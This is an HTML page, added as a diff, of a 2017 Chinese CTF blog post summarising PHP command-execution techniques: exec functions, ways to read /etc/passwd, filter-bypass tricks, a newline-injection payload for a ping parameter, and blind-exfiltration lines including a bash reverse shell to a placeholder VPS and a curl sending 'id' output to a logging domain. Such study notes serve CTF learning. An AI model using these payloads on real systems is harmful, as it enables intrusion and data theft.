@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="PHP可以命令执行的函数Exec() System() Passthru() Shell_exec() 读文件的各种各样的方法：常用方法：cat    由第一行开始显示内容，并将所有内容输出 tac    从最后一行倒序显示内容，并将所有内容输出 more   根据窗口大小，一页一页的现实文件内容 less   和more类似，但其优点可以往前翻页，而且进行可以搜索字符 head   只显示头几行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctf之命令执行小总结">
+<meta property="og:url" content="http://hebic.me/2017/09/26/ctf之命令执行小总结/index.html">
+<meta property="og:site_name" content="Homaebic-Know thyself">
+<meta property="og:description" content="PHP可以命令执行的函数Exec() System() Passthru() Shell_exec() 读文件的各种各样的方法：常用方法：cat    由第一行开始显示内容，并将所有内容输出 tac    从最后一行倒序显示内容，并将所有内容输出 more   根据窗口大小，一页一页的现实文件内容 less   和more类似，但其优点可以往前翻页，而且进行可以搜索字符 head   只显示头几行">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2017-09-26T11:07:25.833Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ctf之命令执行小总结">
+<meta name="twitter:description" content="PHP可以命令执行的函数Exec() System() Passthru() Shell_exec() 读文件的各种各样的方法：常用方法：cat    由第一行开始显示内容，并将所有内容输出 tac    从最后一行倒序显示内容，并将所有内容输出 more   根据窗口大小，一页一页的现实文件内容 less   和more类似，但其优点可以往前翻页，而且进行可以搜索字符 head   只显示头几行">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>ctf之命令执行小总结</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/friends/">Friendly link</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2017/10/07/一道题目writeup/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
+        
+        
+        <li><a class="icon" href="/2017/09/19/四川省大学生信息安全线上VulC0d3 WriteUp/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://hebic.me/2017/09/26/ctf之命令执行小总结/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://hebic.me/2017/09/26/ctf之命令执行小总结/&text=ctf之命令执行小总结"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://hebic.me/2017/09/26/ctf之命令执行小总结/&title=ctf之命令执行小总结"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://hebic.me/2017/09/26/ctf之命令执行小总结/&is_video=false&description=ctf之命令执行小总结"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctf之命令执行小总结&body=Check out this article: http://hebic.me/2017/09/26/ctf之命令执行小总结/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://hebic.me/2017/09/26/ctf之命令执行小总结/&title=ctf之命令执行小总结"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://hebic.me/2017/09/26/ctf之命令执行小总结/&title=ctf之命令执行小总结"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://hebic.me/2017/09/26/ctf之命令执行小总结/&title=ctf之命令执行小总结"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://hebic.me/2017/09/26/ctf之命令执行小总结/&title=ctf之命令执行小总结"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://hebic.me/2017/09/26/ctf之命令执行小总结/&name=ctf之命令执行小总结&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP可以命令执行的函数"><span class="toc-number">1.</span> <span class="toc-text">PHP可以命令执行的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#读文件的各种各样的方法："><span class="toc-number">2.</span> <span class="toc-text">读文件的各种各样的方法：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#常用方法："><span class="toc-number">2.1.</span> <span class="toc-text">常用方法：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#歪门邪道："><span class="toc-number">2.2.</span> <span class="toc-text">歪门邪道：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#命令执行绕过方法："><span class="toc-number">3.</span> <span class="toc-text">命令执行绕过方法：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一个题目："><span class="toc-number">4.</span> <span class="toc-text">一个题目：</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        ctf之命令执行小总结
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Homaebic-Know thyself</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2017-09-26T08:03:57.000Z" itemprop="datePublished">2017-09-26</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="PHP可以命令执行的函数"><a href="#PHP可以命令执行的函数" class="headerlink" title="PHP可以命令执行的函数"></a>PHP可以命令执行的函数</h3><p><code>Exec()</code></p>
+<p><code>System()</code></p>
+<p><code>Passthru()</code></p>
+<p><code>Shell_exec()</code></p>
+<h3 id="读文件的各种各样的方法："><a href="#读文件的各种各样的方法：" class="headerlink" title="读文件的各种各样的方法："></a>读文件的各种各样的方法：</h3><h4 id="常用方法："><a href="#常用方法：" class="headerlink" title="常用方法："></a>常用方法：</h4><p><code>cat    由第一行开始显示内容，并将所有内容输出</code></p>
+<p><code>tac    从最后一行倒序显示内容，并将所有内容输出</code></p>
+<p><code>more   根据窗口大小，一页一页的现实文件内容</code></p>
+<p><code>less   和more类似，但其优点可以往前翻页，而且进行可以搜索字符</code></p>
+<p><code>head   只显示头几行</code></p>
+<p><code>tail   只显示最后几行</code></p>
+<p><code>nl     类似于cat -n，显示时输出行号</code></p>
+<p><code>tailf  类似于tail -f</code></p>
+<p><code>Vim 使用vim工具打开文本</code></p>
+<p><code>Vi 使用vi打开文本</code></p>
+<h4 id="歪门邪道："><a href="#歪门邪道：" class="headerlink" title="歪门邪道："></a>歪门邪道：</h4><p><code>Curl file:///etc/passwd</code></p>
+<p><code>String/etc/passwd</code></p>
+<p><code>Echo&lt; /etc/passwd</code></p>
+<p><code>Uniq -c/etc/passwd</code></p>
+<p><code>Bash -v /etc/passwd</code></p>
+<p><code>Rev/etc/passwd</code></p>
+<h3 id="命令执行绕过方法："><a href="#命令执行绕过方法：" class="headerlink" title="命令执行绕过方法："></a>命令执行绕过方法：</h3><p>####黑名单：</p>
+<p><code>a=l;b=s;ab</code></p>
+<p><code>a=c;b=at;c=heb;d=ic;ab{c}{d}</code></p>
+<p>####没有回显：</p>
+<p><code>bash -i &gt;&amp; /dev/tcp/xxxxxI(你的vps的公网ip)/8080 0&gt;&amp;1</code></p>
+<p><code>curl whoami.xxxx.xxx(子域名)\</code></p>
+<p><code>Wget、ping</code></p>
+<p><code>curlikyzvu.ceye.io/$(id|base64)</code></p>
+<h3 id="一个题目："><a href="#一个题目：" class="headerlink" title="一个题目："></a>一个题目：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</div></pre></td></tr></table></figure>
+<p>$target可控，又限制的比较死，各种字符都过滤了。使用%0a换行，然后直接执行需要的命令。</p>
+<p>Payload: <a href="http://XXXX:83/index.php?ip=127.0.0.1%0als" target="_blank" rel="external">http://XXXX:83/index.php?ip=127.0.0.1%0als</a></p>
+<p>来源：<a href="https://chybeta.github.io/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/#WEB-03" target="_blank" rel="external">https://chybeta.github.io/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/#WEB-03</a></p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/friends/">Friendly link</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP可以命令执行的函数"><span class="toc-number">1.</span> <span class="toc-text">PHP可以命令执行的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#读文件的各种各样的方法："><span class="toc-number">2.</span> <span class="toc-text">读文件的各种各样的方法：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#常用方法："><span class="toc-number">2.1.</span> <span class="toc-text">常用方法：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#歪门邪道："><span class="toc-number">2.2.</span> <span class="toc-text">歪门邪道：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#命令执行绕过方法："><span class="toc-number">3.</span> <span class="toc-text">命令执行绕过方法：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一个题目："><span class="toc-number">4.</span> <span class="toc-text">一个题目：</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://hebic.me/2017/09/26/ctf之命令执行小总结/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://hebic.me/2017/09/26/ctf之命令执行小总结/&text=ctf之命令执行小总结"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://hebic.me/2017/09/26/ctf之命令执行小总结/&title=ctf之命令执行小总结"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://hebic.me/2017/09/26/ctf之命令执行小总结/&is_video=false&description=ctf之命令执行小总结"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctf之命令执行小总结&body=Check out this article: http://hebic.me/2017/09/26/ctf之命令执行小总结/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://hebic.me/2017/09/26/ctf之命令执行小总结/&title=ctf之命令执行小总结"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://hebic.me/2017/09/26/ctf之命令执行小总结/&title=ctf之命令执行小总结"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://hebic.me/2017/09/26/ctf之命令执行小总结/&title=ctf之命令执行小总结"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://hebic.me/2017/09/26/ctf之命令执行小总结/&title=ctf之命令执行小总结"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://hebic.me/2017/09/26/ctf之命令执行小总结/&name=ctf之命令执行小总结&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 Homaebic-Know thyself
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/friends/">Friendly link</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-86660611-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+
